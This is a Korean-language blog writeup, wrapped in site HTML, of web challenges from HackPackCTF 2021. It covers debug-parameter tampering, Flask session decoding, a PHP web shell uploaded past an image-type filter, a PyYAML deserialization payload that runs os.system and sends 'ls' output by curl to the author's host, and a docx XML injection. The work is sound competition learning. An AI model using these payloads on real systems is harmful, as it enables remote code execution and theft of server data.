@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <link rel="canonical" href="https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/"/>
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta property="og:title" content="JHYEON BLOG">
+  <meta property="og:description" content="Web Development & Security Research">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>HackPackCTF 2021 Writeup - JHYEON</title>
+  
+    <meta name="keywords" content="CTF,Web,CTFtime,Pwn,Rev,Crypto,HackPackCTF 2021">
+  
+
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/rss2.xml" title="JHYEON" type="application/rss+xml">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header always shadow blur show"  >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            JHYEON
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>Categories
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>Tags
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>Archive
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=https://mypf.jhyeon.dev
+                  
+                  
+                  
+                    id="https:mypfjhyeondev"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>About Me
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>Categories
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>Tags
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>Archive
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=https://mypf.jhyeon.dev
+                  
+                  
+                  
+                    id="https:mypfjhyeondev"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>About Me
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="/img/background/background3.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">JHYEON</p>
+    
+    
+      <p class="subtitle">Devops (Development & Operation) & Security Engineer</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        HackPackCTF 2021 Writeup
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/img/header/cat.jpeg">
+    <p>jhyeon</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/CTF/">CTF</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : Apr 18, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="HackPackCTF 2021 Writeup" data-path="/2021/04/18/hackpackctf-210418/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        View
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><h1 id="HackPackCTF-2021-Write-Up"><a href="#HackPackCTF-2021-Write-Up" class="headerlink" title="HackPackCTF 2021 Write Up"></a>HackPackCTF 2021 Write Up</h1><p>Category: CTF, Web<br>Create Time: Apr 17, 2021 7:43 AM<br>Last Edited Time: Apr 17, 2021 8:39 AM</p>
+<h3 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h3><p>RITSEC CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctf2021.hackpack.club/team">https://ctf2021.hackpack.club/team</a></li>
+<li>pwnhub (jhyeon, owl, 3kk, MalHyuk)</li>
+<li>rank : 81th (400pt)</li>
+</ul>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas"><a href="#Web-“N”ot-“G”am”I”ng-a”N”ymore-in-“X”mas" class="headerlink" title="[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas"></a>[Web]  <strong>“N”ot “G”am”I”ng a”N”ymore in “X”mas</strong></h3><p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.46.32.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.46.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.46.32.png"></p>
+<pre><code class="php">POST / HTTP/1.1
+Host: no-gaming-anymore-in-xmas.ctf2021.hackpack.club
+Connection: close
+Content-Length: 7
+Cache-Control: max-age=0
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club/
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _817ab=http://192.168.181.15:11000
+
+debug=0</code></pre>
+<p>이렇게 POST 요청 패킷을 잡아보면, debug라는 매개변수가 0으로 넘어가고 있다.</p>
+<p>이 변수의 값을 1로 고치면 된다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.47.42.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.47.42.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.47.42.png"></p>
+<p>그럼 이렇게 nginx.conf(설정 파일) 내용이 출력되는데, 플래그 경로가 /maybehereimportantstuff 라고</p>
+<p>친절히 알려주고 있으므로 해당 경로에 가서 플래그를 얻자</p>
+<p><code>flag&#123;ng1nx_m1sconf1g_c4n_b3_h4rmful&#125;</code></p>
+<hr>
+<h3 id="Web-All-about-resetting"><a href="#Web-All-about-resetting" class="headerlink" title="[Web] All about resetting"></a>[Web] All about resetting</h3><p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.49.28.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.49.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.49.28.png"></p>
+<p>문제 페이지에 가면 이렇게 로그인창이 하나 뜬다, 그런데 함정이다 로그인이 안된다.</p>
+<p>하지만, Forgot Password? 라는 것을 이용하면 된다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.50.32.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.50.32.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.50.32.png"></p>
+<p>그러면 이렇게 리셋창이 뜨면서 이메일을 입력하라고 나오는데, 이메일은 메인 페이지에서</p>
+<p>view source를 하면 이메일 힌트가 나온다.</p>
+<pre><code class="html">&lt;!-- Maintaned by Nikos (npantel@ncsu.edu) --&gt;</code></pre>
+<p>이 계정을 입력하고 넘어가면, 보안 질문이랍시고 하나뜨는데 첨엔 게싱인줄 알았으나 페이지 내 세션 값을</p>
+<p>확인해보니, Flask Session 세팅이 되어있었다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.52.06.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.52.06.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.52.06.png"></p>
+<pre><code class="html">session=.eJyrVkpLzMyJT84rUbIy0QFyyvKLMktS0_PLUovyEvOSU5WslLITszOLS_KTixKTK5UQakpSE3OBsvk5lbkFmYnJ-cVKtQBdfhye.YHoVAA.aycuGSStMwxhlgfa3ntQEuZ73FM</code></pre>
+<p>해당 세션 값을 Flask Session Decode 처리해주면, 세션에 어떤 내용이 들어있는지 확인할 수 있다.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.kirsle.net/wizards/flask-session.cgi">https://www.kirsle.net/wizards/flask-session.cgi</a></li>
+</ul>
+<pre><code class="json">&#123;
+    &quot;fail_cnt&quot;: 4,
+    &quot;favoritegovernance&quot;: &quot;kakistocracy&quot;,
+    &quot;favoriteteam&quot;: &quot;olympiacos&quot;
+&#125;</code></pre>
+<p>goverance 값을 구했다. 해당 값을 입력하니 플래그가 뜬다.</p>
+<p><code>flag = flag&#123;Wh4t_1s_th1s_gov3rn4nc3_!!!&#125;</code></p>
+<hr>
+<h3 id="Web-Indead-v1"><a href="#Web-Indead-v1" class="headerlink" title="[Web] Indead v1"></a>[Web] Indead v1</h3><p>누가 봐도 파일 업로드를 통해 웹 쉘을 띄우라는 문제이다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.56.28.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__7.56.28.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__7.56.28.png"></p>
+<p>그렇지만, 일반적으로 php 확장자를 쓰거나 php type을 가지는 파일은 업로드할 수 없고 오직</p>
+<p>“이미지 파일(jpg, png, gif)” 만 업로드가 가능했다.</p>
+<p>이는 문제 유형에 따라 단순 우회가 될 수 있고 조금 thinking을 해야 하는 경우도 있는데</p>
+<p>단순 우회라고 하면은 filename extension 첫 번째 값만 검사를 한다거나, content-type 변조만으로</p>
+<p>우회 케이스가 발생하는 그런 경우를 말한다.</p>
+<p>하지만 이 문제는 후자로 thinking을 조금 해야 하는 문제였지만, 그렇게 어렵진 않다.</p>
+<p>php 웹 쉘을 만들고 나서 file signature 부분을 image로 인식할 수 있게 교묘하게 우회하면 된다.</p>
+<p>이렇게 웹 쉘을 업로드하고 나면, 경로를 찾아야 하는데 마침 업로드가 된 파일(이미지)를 홈페이지 내에</p>
+<p>불러와서 출력하는 기능이 있다. 해당 경로값을 따서 들어가면 된다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.00.52.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.00.52.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.00.52.png"></p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.02.01.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.02.01.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.02.01.png"></p>
+<p>플래그는 /var/www/flag.txt 에 있다고 하니 경로 내 파일을 읽어주면 된다.</p>
+<p>?cmd=cat /var/www/flag.txt</p>
+<p><code>flag&#123;y3t_an0ther_file_uplo@d_vuln&#125;</code></p>
+<hr>
+<h3 id="Web-Yaml-2-Json"><a href="#Web-Yaml-2-Json" class="headerlink" title="[Web] Yaml-2-Json"></a>[Web] Yaml-2-Json</h3><p>YAML 형식을 JSON으로 바꿔서 출력시켜주는 문제이다. 간단한 예제를 들어보면 아래와 같은 구조이다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/image.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/image.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/image.png"></p>
+<p><a target="_blank" rel="noopener" href="https://velog.io/@bloomspes/yaml-%ED%8C%8C%EC%9D%BC-%EC%9E%91%EC%84%B1-%EC%9A%94%EB%A0%B9-%EA%B8%B0%EC%B4%88%ED%8E%B8-%EC%8A%A4%ED%94%84%EB%A7%81%ED%8E%B8">https://velog.io/@bloomspes/yaml-파일-작성-요령-기초편-스프링편</a></p>
+<p>여기서 yaml 문법을 입력하면 결과적으로 json 문법으로 반환되어 출력되는데 이 과정에서 힌트를 얻을 수</p>
+<p>있었다. 패킷을 잡아보면 preimum이라는 매개변수가 세팅되어 날아가는데 이 값을 1로 고치면 PyYAML 이라는</p>
+<p>스폐셜(?) 프리미엄 기능을 사용할 수 있다고 한다. 그래서 PyYAML Deserialization 을 통한 Exploit이 가능</p>
+<p>할 것이라고 판단하고 아래와 같은 페이로드를 통해 내 서버로 output이 날아오게끔 세팅했다.</p>
+<pre><code class="json">!!python/object/apply:os.system [&quot;curl http://myip/?`ls`&quot;]</code></pre>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/2021-04-17_1.28.41.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/2021-04-17_1.28.41.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/2021-04-17_1.28.41.png"></p>
+<p>그랬더니 정상적으로 출력값이 날아오길래, “/tmp/flag.txt” 에 플래그 파일이 있다는 설명을 보고 바로</p>
+<p>읽어서 문제를 풀이했다.</p>
+<p><code>flag&#123;Py_PyYaml_Yaml_Py&#125;</code></p>
+<hr>
+<h3 id="Web-Indead-v2"><a href="#Web-Indead-v2" class="headerlink" title="[Web] Indead v2"></a>[Web] Indead v2</h3><p>이번 문제는 v1에 이어서 v2로 나온 문제이다. 같은 방법으로 파일 업로드를 하는 문제였지만 웹 쉘을 통한 문제는</p>
+<p>아니였다. 아래 사진과 같이 docx를 통해 내용을 입력하고 업로드 해보면 파일 안에 있는 문자를 파싱해서</p>
+<p>그 문자만 출력해주는 구조를 띄고있었다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.13.58.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.13.58.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.13.58.png"></p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.14.53.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.14.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.14.53.png"></p>
+<p>생각을 좀 해보니, XML 문서를 업로드해서 Injection 할 수 있지 않을까 라는 방법이 떠올랐고 실천했다.</p>
+<p>하지만 일단 docx 확장자만을 허용하니 docx로 위장할 수 있는 방법이 먼저 필요했다.</p>
+<p>그에 대한 해답은 python-docx 모듈을 사용해서 위장하는 방법이다.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://pypi.org/project/python-docx/">https://pypi.org/project/python-docx/</a></li>
+</ul>
+<p>이 모듈을 사용하면 하나의 문서(Document) 파일 생성이 가능한데 그 안에 포함된 xml 문서를 변조하여</p>
+<p>업로드하면 XML Injecton과 같은 효과를 볼 수 있다.</p>
+<p>우선 아래 Document를 생성하는 코드이다 (create.py)</p>
+<pre><code class="python">#!/usr/bin/python3
+
+from docx import Document
+
+document = Document()
+paragraph = document.add_paragraph(&#39;hi&#39;)
+document.save(&#39;exploit.docx&#39;)</code></pre>
+<p>코드를 실행하고 폴더에 보면 exploit.docx가 생겼을 것이다 이를 unzip으로 압축 해제하면 여러 xml</p>
+<p>파일이 나오는데 document.xml 파일을 target으로 injection 구문을 만들어주자.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.24.36.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.24.36.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.24.36.png"></p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.31.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.31.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.31.png"></p>
+<p>대충 이렇게 만들어주면 된다. 아까 paragraph로 만들어준 hi 부분을 출력부분으로 만들어주면 된다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.35.46.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.35.46.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.35.46.png"></p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.36.26.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.36.26.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.36.26.png"></p>
+<p>그리고 나서 다시 docx로 압축해서 파일을 업로드하면 된다.</p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.30.57.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.30.57.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.30.57.png"></p>
+<p><img src="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.53.png" class="lazyload" data-srcset="HackPackCTF%202021%20Write%20Up%202d498302ee4b48728fa63f4e1571214f/_2021-04-17__8.38.53.png" srcset="data:image/png;base64,666" alt="/img/post/ctf/hackpackctf2021/_2021-04-17__8.38.53.png"></p>
+<p><code>flag&#123;XML_is_ancestor_0f_every7hing_do_you_agree_?&#125;</code></p>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
+<li>해당 글은 아래 노션에서도 확인하실 수 있습니다.</li>
+</ul>
+<p><img src="https://public.jhyeon.dev/ctf/hackpack2021" class="lazyload" data-srcset="https://public.jhyeon.dev/ctf/hackpack2021" srcset="data:image/png;base64,666" alt="https://public.jhyeon.dev/ctf/hackpack2021"></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2021/04/10/angstormctf-210410/" title="AngStormCTF 2021 Write-Up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">AngStormCTF 2021 Write-Up</span></a><a class="item" href="/2021/03/29/umassctf-210329/" title="UMassCTF'21 Write Up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">UMassCTF'21 Write Up</span></a><a class="item" href="/2021/02/28/aeroctf2021-210228/" title="AeroCTF 2021 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">AeroCTF 2021 Write up</span></a></div></section></div>
+      
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : Apr 18, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTFtime/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTFtime</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwn/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwn</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Rev/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Rev</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Crypto/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Crypto</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HackPackCTF-2021/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>HackPackCTF 2021</p></a></div>
+
+
+        
+      
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/04/12/ritsec-ctf-210412/'>
+          <p class='title'>RITSEC-CTF 2021 Writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>IntroTEAM_NAME :  pwnhub (rank 107th, 2560pt) 
+풀이 게시글은 아래 노션에서 확인하실 수 있습니다.
+https://public.jhyeon...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> Comments</p>
+    
+    <div id="disqus_thread">
+  <div id="notShowDisqus" style="display: none;text-align: center;"><i class='fas fa-exclamation-triangle'></i>&nbsp;Unable to load Disqus, please make sure your network can access.</div>
+  <div id="load-btns"><a class="load-comments" onclick="needLoadDisqus()">Load Disqus</a></div>
+  <div id="loading-comments" style="display: none"><i class="fa fa-cog fa-spin fa-fw fa-2x"></i><br>Checking if Disqus is accessible...</div>
+</div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>TOC</span>
+    
+  </header>
+
+
+    <div class='content'>
